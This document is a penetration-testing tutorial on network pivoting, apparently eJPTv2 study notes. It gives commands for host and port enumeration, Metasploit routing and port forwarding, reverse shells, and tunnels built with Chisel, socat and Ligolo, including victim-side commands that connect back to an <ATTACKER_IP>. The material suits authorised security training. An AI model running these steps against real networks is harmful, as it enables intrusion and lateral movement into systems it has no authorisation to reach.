Pivoting is a critical technique in penetration testing, allowing an attacker to move laterally through a network after compromising an initial system. The goal is to gain access to other systems or network segments that are not directly accessible from the attacker’s original position. This is achieved by leveraging the compromised machine as a relay point.

Pivoting is especially useful for:
- Exploring internal networks.
- Accessing services or machines isolated from the attacker’s starting point.
- Enumerating hosts and identifying vulnerable systems within other network segments.

### Initial Steps for Network Exploration

#### Recommended Commands to Identify Hosts and Interfaces

1. **Enumerating Network Interfaces:**
   - Linux:
     ```
     ip -a
     ifconfig
     ```
   - Windows:
     ```
     ipconfig
     ```

2. **Identifying Active Network Connections:**
   Using `ss` on Linux can help locate open ports and associated IPs:
   ```
   ss -netup
   ```
   If successful, this command may reveal the IP address of another network interface connected to a different segment, providing a potential target for further exploitation.

These commands serve as the foundation for understanding the network topology and planning further actions such as scanning, service enumeration, or setting up routing for pivoting.

## Enumerating Open Ports

### Method 1: Using a Bash Script (Improvement Needed)

The following script scans for common open ports on a range of IP addresses. Note that improvements can be made to optimize this method:

```bash
#!/bin/bash

for i in $(seq 1 254); do
        for port in 21 22 80 443 8080 445; do
                timeout 1 bash -c "echo '' > /dev/tcp/10.10.0.$i/$port" &>/dev/null && echo "[+] Host 10.10.0.$i - PORT $port - OPEN" &
        done
done; wait 
```

### Method 2: Using Ping Sweep One-Liners

#### For Windows:
```
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```

#### For Linux:
```
for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
```

#### For Linux (Port Scanning):
```
for i in {1..65535}; do (echo > /dev/tcp/127.0.0.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

## METASPLOIT FOR PIVOTING (eJPTv2)
The goal of eJPTv2 is to use Metasploit for pivoting.

### METHODS TO ESTABLISH ROUTES

#### Method 1: Using msfconsole for Reverse Shell (Automatic Routing)

1. Exploit the target machine using msfconsole.
2. After obtaining root access via msfconsole, type `background` to suspend the session but keep it active.
3. Use `sessions -l` to list all active session IDs.
4. Search for the autoroute module:
   ```
   search post/multi/manage/autoroute
   ```
   Use it and provide the session ID from step 3 when prompted.
5. Return to the session with:
   ```
   sessions -i <ID>
   ```
   Use port forwarding to access desired ports on the target machine:
   ```
   portfwd add -l <your_port> -p <target_port> -r <target_ip>
   ```

#### Method 2: Establishing a Reverse Shell to msfconsole

1. From msfconsole, use the following module:
   ```
   use multi/handler
   ```
   Configure the necessary parameters to set up a listener.
2. Execute a reverse shell command from the compromised machine.
3. Background the session with `background` and list the session ID using `sessions`.
4. Use the following module to upgrade to a Meterpreter shell:
   ```
   use shell_to_meterpreter
   ```
   Fill in the required parameters (e.g., IP and session ID).
5. Enter the new Meterpreter session:
   ```
   sessions -i <ID>
   ```

**Manual Routing:**
- Exit the session and add routes manually within msfconsole:
  ```
  route add <IP> <SESSION_ID>
  ```
- To remove a route:
  ```
  route del <IP> <SESSION_ID>
  ```

## USING NMAP WITH METASPLOIT
Since Nmap does not integrate directly with Metasploit, use the following module:
``` 
use auxiliary/scanner/portscan/tcp
```
Set the target IP and execute the scan with `run`.

## PORT FORWARDING WITH METASPLOIT
To forward a specific port (e.g., port 80):
``` 
portfwd add -l <your_port> -p 80 -r <victim_ip>
```
Then attack the forwarded port locally.

## ACCESSING LOCALHOST SERVICES
Use SSH to expose internal services:
``` 
ssh -g -L 0.0.0.0:8081:localhost:8080 user@localhost
```
Then forward the port (e.g., 8081) using `portfwd`.

## CONNECTING TO SSH THROUGH ROUTING
Background the session with `Ctrl+Z`, search for the `ssh_login` module, and configure it for the desired target.

# CHISEL FOR PIVOTING (Strict SOCKS Mode)

### Attacker Machine:
Start the Chisel reverse server:
``` 
chisel server --reverse -p 8000
```

### Victim Machine:
Run the following command:
``` 
chisel client <ATTACKER_IP>:8000 R:socks
```

### Proxy Configuration:
Edit `/etc/proxychains4.conf`, uncomment the `strict_chain` section, and add:
``` 
socks5 127.0.0.1 1080
```

### Using Nmap Through the Tunnel:
``` 
proxychains nmap -sT -Pn --top-ports 5000 -open -T5 -v -n <IP> 2>/dev/null
```

### Accessing HTTP in Browser:
Configure FoxyProxy with a new SOCKS5 proxy on port 1080.

### Using Gobuster Through SOCKS:
``` 
gobuster dir -u http://10.0.2.6 -w /usr/share/wordlists/dirb/big.txt --proxy socks5://127.0.0.1:1080
```

### Exposing Internal Services:
``` 
ssh -g -L 0.0.0.0:8081:localhost:8080 user@localhost
```

# CHISEL FOR PIVOTING (Dynamic SOCKS Mode)

If the victim machine can access additional hosts:

1. Start Chisel on the victim machine:
   ``` 
   chisel client <PREVIOUS_MACHINE_IP>:2322 R:8888:socks
   ```

2. On the previous machine, activate Socat to forward traffic:
   ``` 
   ./socat TCP-LISTEN:2322,fork TCP:<CHISEL_CLIENT_IP>:8000
   ```

3. Update `/etc/proxychains4.conf`:
   ``` 
   dynamic_chain
   socks5 127.0.0.1 8888
   ```

# LIGOLO FOR PIVOTING
Download Ligolo from the official repository: [Ligolo-NG](https://github.com/nicocha30/ligolo-ng/releases)

## Setup for Attacker and Third Machine

1. Create a new network interface:
   ``` 
   sudo ip tuntap add user $USER mode tun ligolo
   ```
2. Bring up the interface:
   ``` 
   sudo ip link set ligolo up
   ```
3. Add a route:
   ``` 
   sudo ip route add 10.0.2.0/24 dev ligolo
   ```
4. Start the Ligolo proxy:
   ``` 
   ./proxy -selfcert
   ```
5. Transfer and run the Ligolo agent on the victim machine:
   ``` 
   ./agent -connect <ATTACKER_IP>:<PROXY_PORT> -ignore-cert
   ```
6. Establish the session from the proxy and type `start` to begin routing.

## Handling Reverse Connections:
If the victim machine cannot initiate connections to the attacker:

1. Set up a listener:
   ``` 
   listener_add -addr 0.0.0.0:8080 --to 127.0.0.1:80
   ```
2. List active listeners:
   ``` 
   listener_list
   ```
